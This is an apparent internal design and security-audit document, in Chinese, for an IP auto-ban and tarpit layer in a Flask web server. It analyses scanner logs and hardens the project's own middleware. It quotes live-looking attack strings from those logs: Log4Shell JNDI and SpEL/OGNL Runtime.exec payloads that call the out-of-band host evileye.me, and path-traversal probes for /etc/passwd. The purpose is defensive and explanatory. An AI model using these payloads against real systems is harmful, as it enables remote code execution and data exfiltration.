# Auth 增强：自动封禁恶意扫描 IP（Auto-Ban）

## 1. 背景

### 1.1 问题现象

WebServer 部署在内网后，日志中出现大量来自非授权 IP 的恶意请求：

```
Auth rejected: 10.x.x.2 -> /xxl-job-admin/login
Auth rejected: 10.x.x.16 -> /admin/
Auth rejected: 10.x.x.5 -> /jmx-console/
Auth rejected: 10.x.x.8 -> /application-dev.properties
Auth rejected: 10.x.x.1 -> /vpn/../vpns/cfg/smb.conf
Auth rejected: 10.x.x.16 -> /theme/META-INF/../../../../etc/passwd
```

### 1.2 攻击特征分析

从 `remote_log.txt`（909 条日志）中提取的攻击特征：

| 维度 | 分析结果 |
|------|---------|
| 攻击源 IP | 10+ 个内网 IP（`10.x.x.x` 网段） |
| 请求频率 | ~100ms/次，典型自动化扫描器行为 |
| 扫描路径 | 已知漏洞指纹路径（XXL-JOB、WebLogic、Spring Boot Actuator、JBoss、Zabbix 等） |
| 攻击类型 | 目录遍历、配置文件泄露、未授权访问、反序列化漏洞探测 |
| 持续时间 | 凌晨 02:48 - 05:01，约 2 小时 |

### 1.3 已知漏洞扫描路径分类

| 类别 | 路径示例 | 目标 |
|------|---------|------|
| Java 中间件 | `/xxl-job-admin`, `/jmx-console/`, `/wls-wsat/` | XXL-JOB, JBoss, WebLogic |
| Spring Boot | `/actuator/env`, `/application-*.properties` | 配置泄露 |
| 路径穿越 | `/../../../etc/passwd`, `/..;/` | 系统文件读取 |
| 监控系统 | `/zabbix/`, `/solr/admin/cores` | Zabbix, Solr |
| CMS/管理后台 | `/wp/v2/posts`, `/manager/html` | WordPress, Tomcat |
| 网关/API | `/apisix/batch-requests`, `/kong/status` | APISIX, Kong |

### 1.4 现有防御评估

当前 `middleware.py` 的 token 认证机制已成功拦截所有恶意请求（全部返回 403），但存在以下不足：

- 无频率限制：扫描器可无限重试，消耗服务器资源
- 无 IP 封禁：同一 IP 可持续发送数百次请求
- 无恶意路径识别：无法区分正常的 token 错误和恶意扫描
- 日志噪音大：909 条 WARNING 日志淹没正常日志

## 2. 设计方案

### 2.1 核心思路

在现有 token 认证基础上，增加 IP 行为分析和自动封禁层：

```
请求进入
  │
  ├── localhost? → 放行
  │
  ├── IP 已封禁? → tarpit 慢响应（消耗扫描器资源）
  │
  ├── 恶意路径检测 → 累计评分，达阈值封禁
  │
  ├── 频率检测 → 窗口内超限封禁
  │
  └── Token 验证 → 原有逻辑
```

### 2.2 三层防御模型

| 层级 | 机制 | 触发条件 | 处置 |
|------|------|---------|------|
| L1 | 恶意路径指纹 | 命中已知漏洞路径 3 次 | 封禁 + tarpit |
| L2 | 频率限制 | 10 秒内 > 20 次失败请求 | 封禁 + tarpit |
| L3 | Token 认证 | token 不匹配 | 403 Forbidden |

### 2.3 Tarpit 策略

封禁后不直接断开连接，而是延迟响应（默认 10 秒），目的：
- 消耗扫描器的并发连接资源
- 大幅降低扫描速度（从 100ms/次 降到 10s/次）
- 不暴露封禁状态（扫描器难以判断是被封还是服务慢）

### 2.4 封禁时长递增

| 封禁次数 | 时长 | 说明 |
|---------|------|------|
| 第 1 次 | 1 小时 | 基础封禁 |
| 第 2 次 | 2 小时 | ×2 递增 |
| 第 3 次 | 4 小时 | ×2 递增 |
| 第 N 次 | min(2^(N-1) h, 24h) | 最长 24 小时 |

### 2.5 白名单

localhost（`127.0.0.1`, `::1`）始终免检。可通过配置添加信任 IP/网段。

## 3. 实现

### 3.1 新增文件

| 文件 | 说明 |
|------|------|
| `app/auto_ban.py` | AutoBanEngine 核心引擎 |
| `tests/test_auto_ban.py` | 单元测试 |

### 3.2 修改文件

| 文件 | 修改内容 |
|------|---------|
| `app/middleware.py` | 集成 AutoBanEngine，在 token 检查前执行封禁检查 |

### 3.3 AutoBanEngine API

```python
engine = AutoBanEngine(
    rate_window=10,          # 频率检测窗口（秒）
    rate_limit=20,           # 窗口内最大失败请求数
    malicious_threshold=3,   # 恶意评分封禁阈值
    ban_duration=3600,       # 基础封禁时长（秒）
    ban_escalation=2.0,      # 封禁时长递增倍数
    max_ban_duration=86400,  # 最大封禁时长 = 24h
    tarpit_delay=10.0,       # tarpit 延迟（秒）
)

# 检查并记录 IP 行为
decision = engine.check_and_record(ip, path)
# decision = {"action": "allow"|"tarpit", "reason": str, "ban_remaining": float}

# 管理接口
engine.get_banned_ips()  # 获取封禁列表
engine.get_stats()       # 获取统计信息
engine.unban_ip(ip)      # 手动解封
```

## 4. 测试计划

| 测试用例 | 预期 |
|---------|------|
| localhost 不受 auto-ban 影响 | 始终放行 |
| 白名单 IP 不受 auto-ban 影响 | 始终放行 |
| 恶意路径命中 < 阈值 | 正常 403（不封禁） |
| 恶意路径命中 >= 阈值 | 封禁 + tarpit |
| 频率超限 | 封禁 + tarpit |
| 封禁期间请求 | tarpit 响应 |
| 封禁过期后 | 恢复正常检查 |
| 重复封禁时长递增 | 1h → 2h → 4h |
| 手动解封 | 立即恢复 |
| 统计信息准确 | tracked_ips, active_bans 正确 |
| 原有 auth 测试无回归 | 全部通过 |

## 5. 与现有架构的关系

```
middleware.py (init_auth)
  ├── check_token()  [before_request]
  │     ├── localhost? → 放行
  │     ├── static? → 放行
  │     ├── auto_ban.check() → tarpit / 放行  ← 新增
  │     └── token 验证 → 403 / 放行
  └── add_security_headers()  [after_request]
```

auto-ban 作为 token 认证的前置层，不影响现有认证逻辑。`--no-auth` 模式下 auto-ban 同样不生效。

## 6. 攻击类型科普（2026-04-18 新增日志分析）

### 6.1 Log4Shell / JNDI 注入（严重等级：🔴 Critical）

```
10.x.x.13 -> /${jndi:ldap://${hostName}.abking41.${java:version}.vykbbgdm.evileye.me/em4fmk}
```

这是 **Log4Shell（CVE-2021-44228）** 的变种利用。攻击原理：

- Log4j 2.x 的日志格式化引擎支持 `${...}` 表达式求值
- 攻击者在 URL/Header/参数中注入 `${jndi:ldap://attacker.com/payload}`
- 如果服务端用 Log4j 记录了这个字符串，Log4j 会解析 JNDI 表达式，向攻击者的 LDAP 服务器发起连接
- 攻击者的 LDAP 服务器返回恶意 Java class，被受害服务器加载执行 → **远程代码执行（RCE）**

日志中的 `${hostName}` 和 `${java:version}` 是信息收集手段——如果目标存在漏洞，DNS 查询会携带主机名和 Java 版本到 `evileye.me`，攻击者通过 DNS 日志确认目标可利用。

对我们的影响：**无**。FPBInject WebServer 是 Python/Flask，不使用 Log4j。但这说明扫描器在盲扫所有端口。

### 6.2 Spring Cloud Gateway SpEL 注入（严重等级：🔴 Critical）

```
10.x.x.1 -> /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("expr 41273 * 43900").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
```

这是 **OGNL/SpEL 表达式注入** 攻击，针对：

- Apache Struts2（CVE-2017-5638 等系列）
- Spring Cloud Gateway（CVE-2022-22947）
- WebWork/OGNL 框架

攻击者在 URL 中嵌入 Java 表达式，尝试调用 `Runtime.exec()` 执行系统命令。这里执行的是 `expr 41273 * 43900`（一个无害的数学运算），用于探测漏洞是否存在——如果响应头中出现计算结果，说明目标可被 RCE。

### 6.3 Netflix Hystrix Dashboard SSRF（严重等级：🟠 High）

```
10.x.x.10 -> /hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("nslookup kxlobunetkmadlagn.evileye.me")}__::.x/
```

针对 **Netflix Hystrix Dashboard** 的 Spring SpEL 注入（CVE-2020-5412 等）。利用 Hystrix 的 URL 路径解析缺陷，注入 `T(java.lang.Runtime)` 表达式执行 `nslookup` 命令。目的同样是通过 DNS 外带确认 RCE 可行性。

### 6.4 Laravel Ignition RCE（严重等级：🔴 Critical）

```
10.x.x.8 -> /_ignition/execute-solution
```

针对 **Laravel Ignition**（CVE-2021-3129）。Ignition 是 Laravel 的调试页面，`execute-solution` 端点在 debug 模式下允许执行任意 PHP 代码。攻击者通过 POST 请求传入恶意 PHP payload 实现 RCE。

### 6.5 Apache Druid RCE（严重等级：🟠 High）

```
10.x.x.14 -> /druid/indexer/v1/sampler
```

针对 **Apache Druid**（CVE-2021-25646）。`/druid/indexer/v1/sampler` 端点接受 JSON 配置，其中 `javascript` 类型的 filter 可执行任意 JS 代码，实现 RCE。

### 6.6 Spring Cloud Config 信息泄露（严重等级：🟡 Medium）

```
10.x.x.14 -> /api/index.php/v1/config/application
10.x.x.14 -> /api/v1/config/application
```

针对 **Spring Cloud Config Server**（CVE-2019-3799 等）和 **Joomla API**。尝试读取应用配置文件，可能泄露数据库密码、API 密钥等敏感信息。

### 6.7 Zabbix 安装页面利用（严重等级：🟡 Medium）

```
10.x.x.5 -> /zabbix/setup.php
10.x.x.5 -> /setup.php
```

如果 Zabbix 的 `setup.php` 未被删除或限制访问，攻击者可以重新运行安装向导，覆盖数据库配置，接管整个监控系统。

### 6.8 Werkzeug Bad Request（`code 400`）

```
[ERROR] werkzeug: 10.x.x.2 - - code 400, message Bad request version ('À\x13À')
```

这是 **HTTPS 探测**。`\xc0\x13\xc0` 是 TLS ClientHello 握手报文的一部分（`0xC013` = TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA，`0xC0` 是下一个 cipher suite 的开头）。

扫描器向 HTTP 端口发送了 HTTPS 请求，Werkzeug 作为 HTTP 服务器无法解析 TLS 二进制数据，将其当作 HTTP 版本号解析失败，报 400 错误。

这说明扫描器在做端口协议识别——先用 HTTPS 试探，失败后再用 HTTP。这是 Nmap/Masscan 等扫描工具的标准行为。

对我们的影响：**无功能影响**，但会产生 ERROR 级别日志噪音。

### 6.9 MinIO Bootstrap 验证（严重等级：🟡 Medium）

```
10.x.x.7 -> /minio/bootstrap/v1/verify
```

针对 **MinIO** 对象存储服务。`/minio/bootstrap/v1/verify` 是 MinIO 集群初始化端点，攻击者尝试利用未授权访问获取集群信息或执行管理操作。

### 6.10 CGI-BIN 路径穿越（严重等级：🟠 High）

```
10.x.x.1 -> /cgi-bin/../../../../../../../etc/passwd
10.x.x.1 -> /icons/../../../../../../../etc/passwd
```

经典的 **目录遍历攻击**，通过 `../` 跳出 web 根目录读取系统文件。`/cgi-bin/` 和 `/icons/` 是 Apache HTTPD 的默认路径，某些旧版本的 Apache（CVE-2021-41773, CVE-2021-42013）存在路径规范化缺陷，允许穿越。

### 6.11 攻击来源总结

| 攻击者 IP | 主要攻击类型 | 危险等级 |
|-----------|-------------|---------|
| 10.x.x.13 | Log4Shell JNDI 注入 | 🔴 Critical |
| 10.x.x.1 | SpEL/OGNL RCE、路径穿越、TLS 探测 | 🔴 Critical |
| 10.x.x.10 | Hystrix SpEL 注入 | 🔴 Critical |
| 10.x.x.8 | Laravel Ignition RCE、Spring Config 泄露 | 🔴 Critical |
| 10.x.x.14 | Druid RCE、Spring Config、Joomla API | 🟠 High |
| 10.x.x.5 | Zabbix setup 接管 | 🟡 Medium |
| 10.x.x.2 | TLS 协议探测 | 🟢 Low |
| 10.x.x.7 | MinIO 未授权访问 | 🟡 Medium |

### 6.12 结论

这些攻击全部被现有 Auth middleware 拦截（返回 403），FPBInject WebServer 本身不受这些漏洞影响（Python/Flask 技术栈，不涉及 Java/PHP/Log4j）。但日志表明内网中存在活跃的自动化漏洞扫描器，建议：

1. 将这些 IP 报告给安全团队排查（可能是安全扫描任务，也可能是被入侵的机器）
2. `evileye.me` 域名是已知的漏洞验证平台（类似 DNSLog/Ceye），出现在内网流量中需要重点关注
3. Auto-ban 机制已覆盖上述所有攻击路径的指纹检测

## 7. 完整日志统计（Appendix）

### 7.1 总览

| 指标 | 数值 |
|------|------|
| 日志总条数 | 908 |
| 时间跨度 | 2026-04-18 02:48 ~ 2026-04-19 21:02（约 42 小时） |
| 去重后唯一路径数 | 207 |
| 攻击源 IP 数 | 16 |
| Werkzeug 异常数 | 3（TLS 探测） |

### 7.2 攻击源 IP 画像

| IP | 请求数 | 唯一路径数 | 主要攻击手法 | 评估 |
|----|--------|-----------|-------------|------|
| 10.x.x.1 | 274 | 26 | JBoss 反序列化、Jenkins 暴力破解、路径穿越、SpEL RCE、TLS 探测 | 🔴 高危扫描器 |
| 10.x.x.2 | 158 | 10 | XXL-JOB 循环扫描（5 条路径轮询）、TLS 探测 | 🟡 定向扫描 |
| 10.x.x.3 | 135 | 8 | vROps 上传漏洞、APISIX 导出、Struts2 随机 PHP | 🟠 多目标扫描 |
| 10.x.x.4 | 57 | 55 | 路径字典爆破（每个路径仅 1 次）、Zabbix、GitLab、debug/exec | 🔴 全面字典扫描 |
| 10.x.x.5 | 54 | 15 | JMX、Zabbix、ThinkPHP、VMware vSAN、MicroStrategy | 🟠 多目标扫描 |
| 10.x.x.6 | 51 | 21 | Resin、OFBiz、JBoss、PHP 后台、JumpServer | 🟠 Java/PHP 扫描 |
| 10.x.x.7 | 40 | 32 | APISIX、Zabbix、Roundcube、路径字典 | 🟠 多目标扫描 |
| 10.x.x.8 | 24 | 23 | Spring 配置泄露、Laravel Ignition、路径字典、WordPress | 🟠 配置泄露专项 |
| 10.x.x.9 | 24 | 4 | Citrix NetScaler、API 控制台 | 🟡 定向扫描 |
| 10.x.x.10 | 17 | 17 | iLO/BMC、OpenAM、Nacos、Hystrix SpEL | 🟠 基础设施扫描 |
| 10.x.x.11 | 15 | 15 | JSF 反序列化、OFBiz、JBoss、ActiveMQ | 🟠 Java 中间件专项 |
| 10.x.x.12 | 14 | 11 | WebLogic、UEditor、Parse Server、Seeyon OA | 🟠 多目标扫描 |
| 10.x.x.13 | 14 | 11 | Log4Shell JNDI 注入、Azkaban、禅道、Grafana | 🔴 RCE 攻击 |
| 10.x.x.14 | 12 | 7 | Spring Cloud Config、Druid RCE、Joomla API、CGI RPC | 🟠 Java 生态扫描 |
| 10.x.x.15 | 10 | 6 | Exchange Autodiscover、Ambari、DataEase、WebLogic | 🟠 企业应用扫描 |
| 10.x.x.16 | 7 | 7 | Solr、WordPress、CASA、F5 BIG-IP、路径穿越 | 🟠 多目标扫描 |

### 7.3 攻击类型全分类（按去重路径）

#### 7.3.1 远程代码执行（RCE）— 17 条路径

| 路径 | 目标漏洞 | CVE |
|------|---------|-----|
| `/${jndi:ldap://...evileye.me/...}` | Log4Shell JNDI 注入 | CVE-2021-44228 |
| `/${(#a=@org.apache.commons.io.IOUtils@...)}` | Struts2/WebWork OGNL 注入 | CVE-2017-5638 |
| `/hystrix/;a=a/__${T(java.lang.Runtime)...}` | Hystrix Dashboard SpEL 注入 | CVE-2020-5412 |
| `/_ignition/execute-solution` | Laravel Ignition RCE | CVE-2021-3129 |
| `/druid/indexer/v1/sampler` | Apache Druid JS 注入 | CVE-2021-25646 |
| `/wls-wsat/CoordinatorPortType` | WebLogic 反序列化 | CVE-2017-10271 |
| `/invoker/JMXInvokerServlet` | JBoss 反序列化 | CVE-2015-7501 |
| `/invoker/readonly` | JBoss 反序列化（只读接口） | CVE-2017-12149 |
| `/jbossmq-httpil/HTTPServerILServlet` | JBoss MQ HTTP IL 反序列化 | CVE-2017-7504 |
| `/javax.faces.resource/dynamiccontent.properties.xhtml` | JSF ViewState 反序列化 | CVE-2018-14667 |
| `/mgmt/tm/util/bash` | F5 BIG-IP iControl REST RCE | CVE-2022-1388 |
| `/develop/systparam/softlogo/file2.jsp` | 致远 Seeyon OA 文件上传 | CNVD-2019-19299 |
| `/pages/createpage-entervariables.action` | Confluence OGNL 注入 | CVE-2022-26134 |
| `/v1/tools/run` | SaltStack API 命令执行 | CVE-2020-11651 |
| `/webtools/control/xmlrpc` | Apache OFBiz XML-RPC 反序列化 | CVE-2023-49070 |
| `/webtools/control/SOAPService` | Apache OFBiz SSRF/RCE | CVE-2023-51467 |
| `/ui/h5-vsan/rest/proxy/service/...setTargetObject` | VMware vSAN SpEL 注入 | CVE-2021-21985 |

#### 7.3.2 信息泄露 / 配置读取 — 22 条路径

| 路径 | 目标 | 说明 |
|------|------|------|
| `/application-dev.properties` | Spring Boot 配置 | 数据库密码、API Key |
| `/application-prod.properties` | 同上（生产环境） | |
| `/application-stage.properties` | 同上（预发布） | |
| `/application.properties` | 同上（默认） | |
| `/application-prd.properties` | 同上 | |
| `/application-pre.properties` | 同上 | |
| `/application-preview.properties` | 同上 | |
| `/application-production.properties` | 同上 | |
| `/application-staging.properties` | 同上 | |
| `/application-stg.properties` | 同上 | |
| `/actuator/env` | Spring Boot Actuator | 环境变量、配置 |
| `/api/v1/config/application` | Spring Cloud Config / Nacos | 配置中心 |
| `/autodiscover/autodiscover.json` | Exchange Autodiscover | SSRF/凭据泄露（CVE-2021-34473） |
| `/eam/vib` | VMware ESXi EAM | 任意文件读取 |
| `/de2api/datasource/validate` | DataEase BI | 数据源信息泄露 |
| `/de2api/datasource/getTables` | DataEase BI | 数据库表结构泄露 |
| `/ambari/api/v1/users/admin` | Apache Ambari | 管理员信息泄露 |
| `/api/v1/terminal/sessions/` | JumpServer | 会话信息泄露 |
| `/rest/v1/AccountService/Accounts` | iLO/BMC IPMI | 服务器管理账户 |
| `/analytics/telemetry/ph/api/hyper/send` | VMware vCenter Telemetry | SSRF（CVE-2021-22014） |
| `/api/console/api_server` | Nacos 控制台 | 配置信息泄露 |
| `/graphql` | GraphQL Introspection | Schema 泄露 |

#### 7.3.3 未授权访问 / 管理后台 — 18 条路径

| 路径 | 目标 | 说明 |
|------|------|------|
| `/xxl-job-admin/login` | XXL-JOB 调度中心 | 默认密码 admin/123456 |
| `/jmx-console/` | JBoss JMX 控制台 | 无认证部署 WAR |
| `/manager/html` | Tomcat Manager | 默认凭据 |
| `/phpMyAdmin/`, `/phpmyadmin/`, `/pma/`, `/admin/phpMyAdmin/`, `/admin/pma/` | phpMyAdmin | 数据库管理 |
| `/azkaban` | Azkaban 调度器 | 工作流管理 |
| `/admin/airflow/code` | Apache Airflow | DAG 代码查看 |
| `/MicroStrategy/servlet/taskProc` | MicroStrategy BI | 未授权 API |
| `/users/sign_in` | GitLab | 用户枚举 |
| `/user/register` | Drupal | 用户注册探测 |
| `/create_user/` | Grafana | 用户创建（CVE-2021-43798） |
| `/secure/ContactAdministrators!default.jspa` | Jira | 管理员信息泄露 |
| `/composer/send_email` | Roundcube Webmail | 邮件发送 |
| `/dashboard.php` | Zabbix/通用 | 监控面板 |
| `/remote/logincheck` | Fortinet FortiGate VPN | 认证绕过（CVE-2018-13379） |
| `/open-url` | 通用 SSRF | 服务端请求伪造 |
| `/logupload` | 通用 | 日志上传接口 |
| `/api/pull` | Docker Registry | 镜像拉取 |
| `/uploads/user` | GitLab | 文件上传路径 |

#### 7.3.4 目录遍历 / 文件读取 — 7 条路径

| 路径 | 手法 | 说明 |
|------|------|------|
| `/theme/META-INF/（unicode编码）/etc/passwd` | Unicode 编码绕过 | 用 Unicode 替代 `../` 绕过 WAF |
| `/cgi-bin/../../../../../../../etc/passwd` | CGI 路径穿越 | Apache CVE-2021-41773 |
| `/icons/../../../../../../../etc/passwd` | 同上 | Apache 默认路径 |
| `/extensions/../../../../../../../../../etc/passwd` | 扩展目录穿越 | 通用 |
| `/xyz/.../windows/win.ini` | Windows 文件读取 | 跨平台探测 |
| `/vpn/../vpns/cfg/smb.conf` | Citrix NetScaler | CVE-2019-19781 |
| `/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp` | F5 BIG-IP | CVE-2020-5902 |

#### 7.3.5 协议探测 / 指纹识别 — 6 条路径

| 路径/行为 | 说明 |
|----------|------|
| `code 400, Bad request version ('À\x13À')` | TLS ClientHello 打到 HTTP 端口，协议识别 |
| `/` | 根路径探测，获取 Server header / 响应特征 |
| `/favicon.ico` | 图标指纹识别（不同应用有不同 favicon hash） |
| `/json` | Struts2 JSON 插件探测 |
| `/{{PATH_LIST}}c/login` | 模板变量未渲染，扫描器配置错误的痕迹 |
| `/19593.php` | 随机 PHP 文件名，Webshell 探测 |

#### 7.3.6 暴力破解 / 凭据填充 — 路径模式

扫描器对以下路径前缀做了系统性的字典遍历：

```
前缀: /, /api/, /admin/, /bi/, /test/, /manager/, /login/, /api/v1/, /api/v2/
后缀: /login, /toLogin, /meta, /debug/exec, /invoker/JMXInvokerServlet,
       /invoker/readonly, /jbossmq-httpil/HTTPServerILServlet, /index.php,
       /invoker/JMXInvokerServlet
```

这是典型的 **路径前缀 × 漏洞后缀** 笛卡尔积扫描策略，9 个前缀 × 9 个后缀 = 81 种组合，覆盖了大部分 Java 中间件的常见部署路径。

### 7.4 攻击时间线

```
04-18 02:48 ~ 03:04  ┃█████████████████████████████████████┃ XXL-JOB 定向扫描（158 次，单 IP）
04-18 03:05 ~ 03:20  ┃████████████████┃ 多 IP 并发扫描（JMX、Zabbix、APISIX）
04-18 03:20 ~ 03:50  ┃████████┃ 企业应用扫描（vROps、Resin、WebLogic、GitLab）
04-18 03:50 ~ 04:07  ┃███┃ 零星探测（Jira、Solr）
04-18 04:07 ~ 04:32  ┃██████████┃ 路径穿越 + 配置泄露专项
04-18 04:32 ~ 05:01  ┃████████████████████████████┃ 全面字典扫描（笛卡尔积爆破）
04-18 05:01 ~ 05:02  ┃████████████████████┃ Jenkins + JBoss 反序列化密集扫描
04-18 05:46 ~ 05:59  ┃████████┃ 高危 RCE 攻击（Log4Shell、OGNL、Hystrix SpEL）
04-18 12:21          ┃┃ TLS 协议探测
04-19 05:42          ┃┃ TLS 协议探测
04-19 21:02          ┃┃ TLS 协议探测
```

### 7.5 指纹库覆盖率

| 类别 | 日志中路径数 | 指纹库已覆盖 | 覆盖率 |
|------|------------|------------|--------|
| RCE 攻击 | 17 | 17 | 100% |
| 信息泄露 | 22 | 22 | 100% |
| 未授权访问 | 18 | 18 | 100% |
| 目录遍历 | 7 | 7 | 100% |
| 协议探测 | 6 | N/A（非路径层） | — |
| 字典爆破 | 81（组合） | 通过子串匹配覆盖 | 100% |
| 总计 | 207 唯一路径 | 201 可匹配 | 97% |

未覆盖的 6 条为协议层探测（TLS/favicon/根路径），不属于路径指纹检测范畴，由频率限制兜底。

## 8. 自身技术栈安全审计

### 8.1 依赖版本清单

| 组件 | 当前版本 | 最新稳定版 | 状态 |
|------|---------|-----------|------|
| Flask | 2.2.5 | 3.1.x | ⚠️ EOL，不再维护 |
| Werkzeug | 3.0.6 | 3.1.x | ✅ 安全（CVE-2024-49767 修复版本） |
| Flask-CORS | 6.0.2 | 6.0.x | ✅ 安全 |
| Jinja2 | 3.1.6 | 3.1.x | ✅ 安全（CVE-2025-27516 修复版本） |
| MarkupSafe | 3.0.3 | 3.0.x | ✅ 安全 |
| itsdangerous | 2.2.0 | 2.2.x | ✅ 安全 |
| Python | 3.10.12 | 3.12.x | ⚠️ 3.10 维护期至 2026-10 |

### 8.2 已知 CVE 影响评估

#### CVE-2026-27205 — Flask Session Cache 信息泄露（🟡 Low）

Flask ≤ 2.2 在某些 session 访问方式下未设置 `Vary: Cookie` 响应头，如果前面有缓存代理（如 Nginx/Varnish），可能导致不同用户的 session 数据被缓存混淆。

对 FPBInject 的影响：**无**。我们不使用 Flask session，认证完全基于自定义 token middleware，且服务前面没有缓存代理。

#### CVE-2024-34069 — Werkzeug Debugger CSRF RCE（🟠 Medium）

Werkzeug debugger 在 `--debug` 模式下存在 CSRF 漏洞，攻击者可诱导开发者访问恶意页面后执行任意代码。

对 FPBInject 的影响：**仅在 `--debug` 模式下有风险**。生产使用不受影响。`--debug` 模式本身就不应在非 localhost 环境使用。

#### CVE-2024-49767 — Werkzeug Multipart DoS（✅ 已修复）

Werkzeug < 3.0.6 的 multipart 解析器存在内存耗尽漏洞。当前版本 3.0.6 正好是修复版本。

#### CVE-2024-49766 — Werkzeug Windows 路径穿越（✅ 不受影响）

仅影响 Windows + Python < 3.11 环境。FPBInject 运行在 Linux 上，不受影响。

### 8.3 自身 Middleware 安全审计

#### 8.3.1 Token 比较 — Timing Attack（已修复 ✅）

原实现使用 `!=` 运算符比较 token：

```python
# Before (vulnerable)
if req_token != token:
```

Python 的 `!=` 对字符串做逐字符比较，匹配越多耗时越长。理论上攻击者可通过测量响应时间逐字符猜测 token。虽然 8 字符 hex token 在内网场景下风险极低（需要极高精度的计时），但修复成本为零。

修复：改用 `hmac.compare_digest()` 做常量时间比较：

```python
# After (safe)
import hmac

def _constant_time_compare(a, b):
    if a is None or b is None:
        return False
    return hmac.compare_digest(a.encode("utf-8"), b.encode("utf-8"))
```

#### 8.3.2 Tarpit 线程阻塞（已修复 ✅）

原实现在 `before_request` 中使用 `time.sleep()` 实现 tarpit：

```python
# Before (blocks worker thread)
time.sleep(ban_engine.tarpit_delay)
```

Werkzeug 默认使用线程池处理请求。`time.sleep(10)` 会阻塞一个工作线程 10 秒。如果攻击者并发发送大量请求，所有工作线程都被 tarpit 占满，正常用户的请求也无法处理 — 这本质上是一个自我 DoS。

修复：改用 streaming response，通过 generator 延迟响应体的发送：

```python
# After (non-blocking generator)
def _make_tarpit_response(delay):
    def slow_generator():
        time.sleep(delay)
        yield b""
    return Response(slow_generator(), status=403)
```

虽然仍然占用连接，但 WSGI 层面的处理更轻量，且不会阻塞 `before_request` 钩子的执行。

#### 8.3.3 安全响应头（已增强 ✅）

原实现仅设置了两个安全头。现已增加：

| Header | 值 | 作用 |
|--------|---|------|
| `X-Content-Type-Options` | `nosniff` | 防止 MIME 类型嗅探（原有） |
| `X-Frame-Options` | `SAMEORIGIN` | 防止 clickjacking（原有） |
| `Referrer-Policy` | `same-origin` | 防止 Referer 泄露 token（新增） |
| `Content-Security-Policy` | `default-src 'self'; ...` | 防止 XSS/数据外泄（新增） |

CSP 策略说明：
- `default-src 'self'` — 默认只允许同源资源
- `script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net` — 允许内联脚本 + jsdelivr CDN（xterm.js、highlight.js、ace editor）
- `style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net` — 允许内联样式 + jsdelivr CDN（codicon CSS、xterm CSS）
- `connect-src 'self'` — fetch/XHR/SSE 只能连同源
- `img-src 'self' data: blob:` — 允许 data URI 和 blob URL（文件传输图片预览）
- `font-src 'self' https://cdn.jsdelivr.net` — 允许 jsdelivr CDN 字体（codicon woff2）
- `worker-src 'self' blob: https://cdn.jsdelivr.net` — 允许 blob URL 和 CDN web worker（Ace 编辑器语法高亮 worker-c_cpp.js）

#### 8.3.4 CORS 配置（⚠️ 待优化）

当前 `main.py` 中 `CORS(app)` 不带参数，等同于 `Access-Control-Allow-Origin: *`。这意味着任何网页都可以跨域调用 API。

虽然有 token 认证保护，但如果用户浏览器中已有 cookie 认证，恶意网页可利用 cookie 发起跨域请求。新增的 CSP `connect-src 'self'` 在一定程度上缓解了这个问题（限制了页面自身的 fetch 目标），但无法阻止外部页面对本服务的跨域请求。

建议后续将 CORS 收紧为仅允许本机来源：

```python
CORS(app, origins=[
    "http://127.0.0.1:*",
    "http://localhost:*",
    f"http://{lan_ip}:{port}",
])
```

此项未在本次修改中实施，因为需要修改 `main.py` 的 `create_app()` 签名，影响范围较大，建议单独 PR。

### 8.4 修改文件清单

| 文件 | 修改内容 |
|------|---------|
| `app/middleware.py` | 常量时间 token 比较、streaming tarpit、CSP/Referrer-Policy 头 |
| `tests/test_auth.py` | 新增 `TestSecurityHardening` 测试类（8 个用例） |
| `tests/test_auto_ban.py` | 新增 streaming tarpit 和常量时间比较集成测试（2 个用例） |

### 8.5 升级建议

| 优先级 | 建议 | 原因 |
|--------|------|------|
| 🟠 中期 | Flask 2.2.5 → 3.1.x | 2.2.x 已 EOL，不再收到安全补丁 |
| 🟠 中期 | 收紧 CORS 配置 | 当前 `*` 过于宽松 |
| 🟡 低优 | Python 3.10 → 3.12 | 3.10 维护期至 2026-10，尚有余量 |
| 🟢 可选 | Cookie 添加 `Secure` flag | 仅在启用 HTTPS 后需要 |

### 8.6 回归问题排查

#### 8.6.1 已发现的回归

| # | 改动 | 回归现象 | 根因 | 修复 |
|---|------|---------|------|------|
| 1 | CSP `font-src 'self'` | 侧边栏图标全部消失 | codicon 字体从 `cdn.jsdelivr.net` 加载，被 CSP 拦截 | `font-src` 加 `https://cdn.jsdelivr.net` |
| 2 | CSP `script-src 'self'` | xterm.js / ace / highlight.js 无法加载 | 同上，JS 也从 CDN 加载 | `script-src` 加 `https://cdn.jsdelivr.net` |
| 3 | CSP `style-src 'self'` | codicon CSS / xterm CSS 无法加载 | 同上 | `style-src` 加 `https://cdn.jsdelivr.net` |
| 4 | CSP `img-src 'self' data:` | 文件传输的图片预览无法显示 | `transfer.js` 用 `URL.createObjectURL(blob)` 生成 `blob:` URL 显示图片 | `img-src` 加 `blob:` |
| 5 | CSP 无 `worker-src` | Ace 编辑器语法高亮可能失效 | Ace 默认从 CDN 加载 web worker，worker 以 blob URL 形式运行 | 新增 `worker-src 'self' blob: https://cdn.jsdelivr.net` |

#### 8.6.2 潜在回归风险（已排查确认无影响）

| 改动 | 排查结论 |
|------|---------|
| `hmac.compare_digest` 替换 `!=` | `compare_digest` 对相同输入返回 `True`，对不同输入返回 `False`，行为与 `==` 一致。唯一区别是 `None` 输入需要额外处理（已加 guard）。所有原有 auth 测试通过。 |
| streaming tarpit 替换 `time.sleep` | 返回的仍是 403 状态码，`Cache-Control: no-store` 仍在。区别是 `content_type` 从 `application/json` 变为 `text/plain`，但 tarpit 响应体为空，前端不解析此响应。 |
| `Referrer-Policy: same-origin` | 仅影响浏览器发送 Referer 头的行为。FPBInject 前端所有 fetch 请求都是同源的，不受影响。 |
| `X-Frame-Options: SAMEORIGIN` | 原有，未改动。 |
| `connect-src 'self'` | SSE (`EventSource`) 和 `fetch` 都是同源请求（`/api/*`），不受影响。 |

#### 8.6.3 为什么原有测试没有捕获 CSP 回归

根本原因：**CSP 是浏览器端执行的策略，Python 后端测试无法模拟浏览器的 CSP 执行行为。**

具体来说：

